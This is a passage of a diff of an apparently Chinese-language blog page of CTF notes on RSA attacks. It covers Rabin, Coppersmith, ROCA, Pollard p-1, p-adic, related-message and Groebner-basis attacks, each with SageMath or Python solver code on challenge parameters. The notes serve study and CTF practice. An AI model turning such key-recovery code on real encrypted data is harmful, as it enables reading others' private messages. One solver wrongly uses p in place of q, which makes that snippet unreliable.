<span class="number">1</span>)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(<span class="built_in">set</span>(AMM(mp, k, p, <span class="literal">True</span>)))</span><br><span class="line"></span><br><span class="line">p = <span class="number">90015842079287188147863599089252975950229149674532065188179308662941668349067</span></span><br><span class="line">q = <span class="number">115639966729427613784046359856154071033236356854800852136894409690977637028073</span></span><br><span class="line">e = <span class="number">458759</span></span><br><span class="line">c = <span class="number">9377489940941407443668888914142468523442868076408679603369421619879641628020535221060883892082291144102991625695716628752564422493350476912185008866541091</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;gcd(e, p - <span class="number">1</span>) = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;gcd(e, q - <span class="number">1</span>) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">mps = decrypt(c, e, p)</span><br><span class="line">mqs = decrypt(c, e, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;mps = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;mqs = &#125;</span>&#x27;</span>)</span><br><span class="line">ms = []</span><br><span class="line"><span class="keyword">for</span> mp, mq <span class="keyword">in</span> itertools.product(mps, mqs):</span><br><span class="line">    ms.append(CRT([mp, mq], [p, q]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;ms = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
 <h2 id="pq-高位相同"><span class="math inline">\(p,q\)</span>
 高位相同</h2>
 <h3 id="特征-7">特征</h3>
@@ -15444,44 +15611,44 @@ e = 65537 c =
 <h2 id="rabin-攻击">Rabin 攻击</h2>
 <h3 id="特征-8">特征</h3>
 <p><span class="math inline">\(e=2\)</span></p>
-<h3 id="原理-10">原理</h3>
+<h3 id="原理-11">原理</h3>
 <ul>
 <li><p>计算出 <span class="math inline">\(m_p\)</span> 和<span class="math inline">\(m_q\)</span>： <span class="math display">\[
-m_p=\sqrt{c}\mod{p}\\
+m_p=\sqrt{c}\mod{p}\newline
 m_q=\sqrt{c}\mod{q}
 \]</span></p></li>
 <li><p>利用扩展欧几里得算法计算出 <span class="math inline">\(y_p\)</span> 和 <span class="math inline">\(y_q\)</span> <span class="math display">\[
 y_p·p+y_q·q=1
 \]</span></p></li>
 <li><p>然后解得四个明文： <span class="math display">\[
-a=(y_p·p·m_q+y_q·q·m_p)\pmod{n}\\
-b=n-a\\
-c=(y_p·p·m_q-y_q·q·m_p)\pmod{n}\\
+a=(y_p·p·m_q+y_q·q·m_p)\pmod{n}\newline
+b=n-a\newline
+c=(y_p·p·m_q-y_q·q·m_p)\pmod{n}\newline
 d=n-c
 \]</span></p></li>
 <li><p>其中，如果<span class="math inline">\(p,q\)</span>是形为<span class="math inline">\(4k+3\)</span>的不同素数，即<span class="math inline">\(p\equiv q\equiv 3\pmod{4}\)</span>，则 <span class="math display">\[
-m_p=c^{\frac{1}{4}(p+1)}\pmod{p}\\
+m_p=c^{\frac{1}{4}(p+1)}\pmod{p}\newline
 m_q=c^{\frac{1}{4}(q+1)}\pmod{q}
 \]</span></p></li>
 </ul>
 <h3 id="实现-10">实现</h3>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n=<span class="number">523798549</span></span><br><span class="line">p=<span class="number">10663</span></span><br><span class="line">q=<span class="number">49123</span></span><br><span class="line">e=<span class="number">2</span></span><br><span class="line">c=<span class="number">162853095</span></span><br><span class="line">a,inv_q ,inv_p= gmpy2.gcdext(q,p)</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">a = (inv_p * p * mq + inv_q * q * mp) % n</span><br><span class="line">b = n - <span class="built_in">int</span>(a)</span><br><span class="line">c = (inv_p * p * mq - inv_q * q * mp) % n</span><br><span class="line">d = n - <span class="built_in">int</span>(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>(a, b, c, d):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
 <h2 id="最小根求解">最小根求解</h2>
-<h3 id="原理-11">原理</h3>
+<h3 id="原理-12">原理</h3>
 <p>Coppersmith 定理指出在一个 <span class="math inline">\(e\)</span>
 阶的 <span class="math inline">\(mod\ n\)</span> 多项式 <span class="math inline">\(f(x)\)</span> 中，如果有一个根小于 <span class="math inline">\(n^\frac{1}{e}\)</span> ，就可以运用一个 O(log n)
 的算法求出这些根。</p>
 <p>这个定理可以应用于 RSA 算法。如果 <span class="math inline">\(e =
 3\)</span>
 并且在明文当中只有三分之二的比特是已知的，这种算法可以求出明文中所有的比特。</p>
-<h3 id="代码">代码</h3>
+<h3 id="代码-2">代码</h3>
 <p>一般来说我们借助 Sagemath 中的 <code>small_roots</code>
 函数替代求解。</p>
 <h2 id="pq-存在相同-module-攻击"><span class="math inline">\(p,q\)</span> 存在相同 module 攻击</h2>
 <h3 id="特征-9">特征</h3>
 <p><span class="math inline">\(p,q\)</span> 的生成需要借助某共同的
 module <span class="math inline">\(M\)</span> 进行生成</p>
-<h3 id="代码-1">代码</h3>
+<h3 id="代码-3">代码</h3>
 <p>直接使用他人的脚本，roca 攻击：<a href="https://github.com/jvdsn/crypto-attacks/blob/c26872bdac2e2d95c5be00e6e593c891c849f446/attacks/factorization/roca.py">https://github.com/jvdsn/crypto-attacks/blob/c26872bdac2e2d95c5be00e6e593c891c849f446/attacks/factorization/roca.py</a></p>
 <p>论文《The Return of Coppersmith’s Attack: Practical Factorization of
 Widely Used RSA Moduli》指出该攻击方式中 <span class="math inline">\(m,t\)</span> 的选择依据为 <span class="math inline">\(N\)</span> 的位数。</p>
@@ -15527,7 +15694,7 @@ Widely Used RSA Moduli》指出该攻击方式中 <span class="math inline">\(m,
 <p>或者 <span class="math inline">\(\gcd(e,
 \varphi(p))\neq1\)</span>，即 <span class="math inline">\(e\)</span> 与
 <span class="math inline">\(\varphi(p)\)</span> 不互素的情况。</p>
-<h3 id="原理-12">原理</h3>
+<h3 id="原理-13">原理</h3>
 <p><span class="math inline">\(e\)</span>
 较小时，有限域开方速度较快。</p>
 <p>同时运用到了高次剩余的定理：</p>
@@ -15544,17 +15711,17 @@ c\pmod{n}\)</span></p>
 <p>我们可以在 <span class="math inline">\(p,q\)</span>
 域中分别开方得到同余式组（加快求解速度） <span class="math display">\[
 \begin{cases}
-m_1=\sqrt[e]{c}\pmod{p}\\
+m_1=\sqrt[e]{c}\pmod{p}\newline
 m_2=\sqrt[e]{c}\pmod{q}
 \end{cases}
 \]</span> 然后利用 CRT 得到 <span class="math display">\[
 \begin{cases}
-m_1=\sqrt[e]{c}\pmod{p}\\
-m_2=\sqrt[e]{c}\pmod{q}\\
+m_1=\sqrt[e]{c}\pmod{p}\newline
+m_2=\sqrt[e]{c}\pmod{q}\newline
 m=\sqrt[e]{c}\pmod{n}
 \end{cases}
 \]</span> 但因为有多解，所以需要进行验证。</p>
-<h3 id="代码-2">代码</h3>
+<h3 id="代码-4">代码</h3>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    P.&lt;x&gt;=Zmod(p)[]</span><br><span class="line">    f=x^e-c</span><br><span class="line">    mps=f.roots(multiplicities=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    P.&lt;x&gt;=Zmod(p)[]</span><br><span class="line">    g=x^e-c</span><br><span class="line">    mqs=g.roots(multiplicities=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    ms = []</span><br><span class="line">	<span class="keyword">import</span> itertools</span><br><span class="line">    <span class="keyword">for</span> mp, mq <span class="keyword">in</span> itertools.product(mps, mqs):</span><br><span class="line">        m = mp.crt(mq)</span><br><span class="line">        ms.append(m)</span><br><span class="line">    <span class="keyword">return</span> ms</span><br><span class="line"></span><br><span class="line">ms = solve(p, q, e, c)</span><br><span class="line"><span class="built_in">print</span>(ms)</span><br></pre></td></tr></table></figure>
 <p>也可以尝试使用 Sagemath 自带的 <code>nth_root()</code> 函数。</p>
 <p>线程加速 <code>check</code>：</p>
@@ -15584,7 +15751,7 @@ m=\sqrt[e]{c}\pmod{n}
 光滑数分解</h2>
 <h3 id="特征-11">特征</h3>
 <p><span class="math inline">\(p-1\)</span> 为光滑数。</p>
-<h3 id="原理-13">原理</h3>
+<h3 id="原理-14">原理</h3>
 <p>已知 <span class="math inline">\(p-1\)</span> 为若干个
 <code>primes</code> 元素相乘得到的平滑数，其中 <code>primes</code>
 为一组已知素数，不妨取 <span class="math display">\[
@@ -15609,10 +15776,10 @@ N\)</span>，可以证明与 <span class="math inline">\(1\pmod{p}\)</span>
 同余。</p>
 <h3 id="实例-2">实例</h3>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrime</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p, q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line"><span class="comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br></pre></td></tr></table></figure>
-<h3 id="代码-3">代码</h3>
+<h3 id="代码-5">代码</h3>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">c = <span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">P = prod(primes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的3是任取的</span></span><br><span class="line">pp = <span class="built_in">pow</span>(<span class="number">3</span>, P, n) - <span class="number">1</span></span><br><span class="line">p = gcd(pp, n)</span><br><span class="line">q = n // <span class="built_in">int</span>(p)</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure>
 <h3 id="pollard-p-1-method">Pollard p-1 method</h3>
-<h4 id="原理-14">原理</h4>
+<h4 id="原理-15">原理</h4>
 <p>对于 <span class="math inline">\(p-1\)</span>
 为光滑数，更有效且通用的方法是使用 <code>Pollard p-1 method</code>
 算法。</p>
@@ -15627,7 +15794,7 @@ g=\gcd(a^{n!}-1,N)
 <p>当 <span class="math inline">\(g=N\)</span> 时，需要修改 <span class="math inline">\(a\)</span> 的值（实际中一般从 2 开始）；</p>
 <p>当 <span class="math inline">\(1&lt;g&lt;N\)</span> 时，那么 <span class="math inline">\(g\)</span> 就是 <span class="math inline">\(N\)</span> 的一个因子。</p>
 <p>同理我们实际上会直接求 <span class="math inline">\(a^{n!}-1\pmod{N}\)</span> 而非 <span class="math inline">\(a^{n!}-1\)</span>。</p>
-<h4 id="代码-4">代码</h4>
+<h4 id="代码-6">代码</h4>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">N = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PollardMethod</span>(<span class="params">N: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Pollard p-1 method</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameters`:</span></span><br><span class="line"><span class="string">        N - 要分解的大素数</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Returns`:</span></span><br><span class="line"><span class="string">        N的一个因子</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> itertools.count(<span class="number">2</span>):</span><br><span class="line">        a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">        g = gcd(a - <span class="number">1</span>, N)</span><br><span class="line">        <span class="keyword">if</span> g == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> g == N:</span><br><span class="line">            a += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(PollardMethod(N))</span><br></pre></td></tr></table></figure>
 <blockquote>
 <p>需要注意的是，个人使用 Python 没办法跑出结果，得用 Sagemath。</p>
@@ -15635,18 +15802,18 @@ g=\gcd(a^{n!}-1,N)
 <p>可以借助 Python 模块 <code>primefac</code> 进行分解：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m primefac -vs -m=p-1 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span><br></pre></td></tr></table></figure>
 <h2 id="p-进数攻击"><span class="math inline">\(p\)</span> 进数攻击</h2>
-<h3 id="原理-15">原理</h3>
+<h3 id="原理-16">原理</h3>
 <p>首先我们知道多项式分解的复杂度在于其项数的多少和系数的大小，同时任意一个数我们可以使用多项式来表达，比如说数字
 1234567890 可以表达为： <span class="math display">\[
 P_{10}(x)=x^{9} + 2x^{8} + 3x^{7} + 4x^{6} + 5x^{5} + 6x^{4} + 7x^{3} +
-8x^{2} + 9x\\
+8x^{2} + 9x\newline
 P(10)=1234567890
 \]</span> 或者是 <span class="math display">\[
 P_{5}(x)=x^{13} + x^{10} + 2x^{9} + 2x^{7} + 2x^{6} + x^{5} + 3x^{4} +
-3x^{3} + 3x\\
+3x^{3} + 3x\newline
 P(5)=1234567890
 \]</span> 甚至是 <span class="math display">\[
-P_{1000}=x^{3} + 234x^{2} + 567x + 890\\
+P_{1000}=x^{3} + 234x^{2} + 567x + 890\newline
 P(1000)=1234567890
 \]</span> 可以发现，在不同的 <span class="math inline">\(p\)</span>
 进数下，多项式的复杂度会发生改变。</p>
@@ -15662,7 +15829,7 @@ P(1000)=1234567890
 <p>代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">N = <span class="number">264048827496427248021277383801027180195275776366915828865010362454006394906519399441496561006668252031429735502465174250525698696973129422193405161920872162928097673289330345041221985548078586423910246601720647996170161319016119241836415788315729493164331517547663558380515400720081995290120793014108439083514403659082115510258023834737471488528527557960636984676435543300074504679264476413252780514962473070445293528877641502742438571110744667739728450283295649865745629276142949963507003094791773183928894536793857609738113546410753895719242547720815692998871947957214118354127328586542848234994500987288641595105</span></span><br><span class="line">base = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = ZZ[]</span><br><span class="line">f = P(N.digits(base))</span><br><span class="line"><span class="comment"># (x^295 + 2*x^249 + x^196 + 1) * (x^295 + 2*x^281 + 2*x^192 + x^100 + 2*x^37 + 1)</span></span><br><span class="line">F_factor = factor(f)</span><br><span class="line">factors = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> F_factor:</span><br><span class="line">    factors.append(fac[<span class="number">0</span>](base))</span><br><span class="line"><span class="built_in">print</span>(factors)</span><br></pre></td></tr></table></figure>
 <h2 id="多项式关联攻击">多项式关联攻击</h2>
-<h3 id="原理-16">原理</h3>
+<h3 id="原理-17">原理</h3>
 <p>如果存在线性相关的明文 <span class="math inline">\(m_1,m_2\)</span>，即存在多项式函数 <span class="math inline">\(f(x)\)</span> 满足 <span class="math display">\[
 m_2=f(m_1)
 \]</span></p>
@@ -15686,7 +15853,7 @@ G(x)&amp;=\gcd(g(m_1)-c_1,g(m_2)-c_2)\newline
 m_1=-G(0)
 \]</span> 在模 <span class="math inline">\(N\)</span> 下也满足。</p>
 <p>故在 RSA 中同样可以构建两式破解明文。</p>
-<h3 id="代码-5">代码</h3>
+<h3 id="代码-7">代码</h3>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">N = <span class="number">5836720399</span></span><br><span class="line">f = <span class="keyword">lambda</span> x: x + <span class="number">17</span></span><br><span class="line">m1 = <span class="number">781027021</span></span><br><span class="line">m2 = f(m1)</span><br><span class="line">g = <span class="keyword">lambda</span> x: <span class="built_in">pow</span>(x, e, N)</span><br><span class="line">c1 = g(m1)</span><br><span class="line">c2 = g(m2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;N = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">e = 5</span></span><br><span class="line"><span class="string">N = 5836720399</span></span><br><span class="line"><span class="string">c1 = 2083888300</span></span><br><span class="line"><span class="string">c2 = 2918851827</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
 <p>可以写出求解代码</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">N = <span class="number">5836720399</span></span><br><span class="line">c1 = <span class="number">2083888300</span></span><br><span class="line">c2 = <span class="number">2918851827</span></span><br><span class="line">f = <span class="keyword">lambda</span> x: x + <span class="number">17</span></span><br><span class="line">m1 = polygen(Zmod(N))</span><br><span class="line">m2 = f(m1)</span><br><span class="line">g = <span class="keyword">lambda</span> x: x ** e</span><br><span class="line">G = gcd(g(m1) - c1, g(m2) - c2)</span><br><span class="line">m1 = <span class="built_in">int</span>(-G(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;m1 = &#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
@@ -15710,7 +15877,7 @@ f_l(x_1,\cdots,x_l)=x_l^e-c_l\equiv 0\pmod{N}
 <p>使用理想求解</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">S = <span class="number">312186279122728322840451063402809132934</span></span><br><span class="line">A = [<span class="number">59306</span>, <span class="number">30233</span>, <span class="number">16498</span>]</span><br><span class="line">B = [<span class="number">3518064068</span>, <span class="number">1743840779</span>, <span class="number">968272001</span>]</span><br><span class="line">C = [<span class="number">3937571722</span>, <span class="number">2632887300</span>, <span class="number">4010585432</span>]</span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">n = <span class="number">18066984073475342789493692613823811785487239998753985805020579267940896948081977001771518523566472410672469410750970677917794989108185341025224936232967134929583548467862041251918442321275217404983105419368662343665374632165656617420205237026045440172381460935460690939381735444035707066029853110776298630061438907984659853208747287992151782531561151400196784932859377900035524366656621630353334553560825733409533365949100590660823734584006536175326697501394564510286279450317686958337988217355014539606930767250922535983519405417158647496890748820686624906060567276540610448840500483189314710494353563879277794541353</span></span><br><span class="line">Cs = [<span class="number">1605011707284276632103824644590203887016797212847098299446289280674897645002161069677543064343533796490420264529467459463526241913229967023798085318628445950097108809898826295428523862026843521177725032160711865551726777679038376141316425909360840477060120073221091013634795786803742332494305103072574470667738491664498087291656588818784515569714358898421758142569763447554120962624497276016496694140100000</span>, <span class="number">181734039700238704012658418593813266912521651894752866626415626828623947405568804251736115950606071068346648144215703817981273278046087507889172667757867256797631566535849534415227715943523579302779674337105968419763028025748461306053447376558392979833811008114700852873079622034093487878691189882417957256088379073866088138200910652985291201335834644957095984704369396287502740148745261121583050802561024</span>, <span class="number">44120289726668300688172841856869479594776389466065225989061060426577417071904451062768078357173832546168316502143084515709199818093521749001394049673866578656496253883891021254583201653096210245674629552133246459157519698072200401130427631509011414976317349970710420293614611921718541830198891304752451947110143182603538593757393837717582250960575842815038472270815811197204422601423145762307051</span>]</span><br><span class="line">cnt = <span class="built_in">len</span>(Cs)</span><br><span class="line"></span><br><span class="line">PR = PolynomialRing(Zmod(n), <span class="string">&#x27;m&#x27;</span>, cnt)</span><br><span class="line">m = PR.gens()  <span class="comment"># 生成 cnt 个 m，用下标区分符号</span></span><br><span class="line">Fs = [((A[i] * m[i]**<span class="number">2</span> + B[i] * m[i] + C[i])**e - Cs[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cnt)]</span><br><span class="line"><span class="comment"># 这里的额外条件可变</span></span><br><span class="line">Fs.append(<span class="built_in">sum</span>(m) - S)</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">G_b = I.groebner_basis()</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> G_b:</span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))  <span class="comment"># 3 个元</span></span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(mi)))</span><br></pre></td></tr></table></figure>
 <h2 id="随机填充多项式">随机填充多项式</h2>
-<h3 id="原理-17">原理</h3>
+<h3 id="原理-18">原理</h3>
 <p>与多项式关联攻击不同的是，在这里我们已知 <span class="math inline">\(c_1,c_2\)</span>，且已知关系 <span class="math display">\[
 m_2=m_1+b
 \]</span> 但我们需要求解的是 <span class="math inline">\(b\)</span>。</p>
@@ -15720,7 +15887,7 @@ m_1^3-c_1\equiv 0\pmod{N}\newline
 \]</span> 由于两式都存在公共根 <span class="math inline">\(m_1\)</span>，那么其对 <span class="math inline">\(m_1\)</span> 的结式有非零零点，即线性方程 <span class="math inline">\(\varphi(P,Q)=0\)</span> 有非零解。</p>
 <p>显然两式的结式是关于 <span class="math inline">\(b\)</span>
 的函数，那么我们可以使用 Coppersmith 方法求解 <span class="math inline">\(b\)</span>，需要满足 <span class="math inline">\(b&lt;N^{1/9}\)</span>。</p>
-<h3 id="代码-6">代码</h3>
+<h3 id="代码-8">代码</h3>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">m1 = <span class="number">12345678909876543211234567890987654321</span></span><br><span class="line"><span class="keyword">assert</span> m1 &lt; N</span><br><span class="line">b = random.getrandbits(<span class="number">16</span>)</span><br><span class="line">m2 = m1 + b</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, N)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, N)</span><br><span class="line"><span class="comment"># print(f&#x27;&#123;p = &#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;&#123;q = &#125;&#x27;)</span></span><br><span class="line"><span class="comment"># 